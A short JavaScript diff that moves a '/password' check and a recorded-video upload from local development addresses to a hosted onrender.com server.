@@ -248,7 +248,7 @@
         return;
     }
     
-    const url = "http://localhost:4900/password";
+    const url = "https://surprise-k7ls.onrender.com/password";
    
  
 
@@ -345,7 +345,7 @@ fetch(url, {
                 const filename = `video-${Date.now()}.webm`;
                 formdata.append("video", blob, filename);
                 
-                fetch("https://192.168.1.21:4200/upload", { method: "POST", body: formdata })
+                fetch("https://surprise-k7ls.onrender.com/upload", { method: "POST", body: formdata })
                     .then(resp => {
                         console.log("Success");
                     })
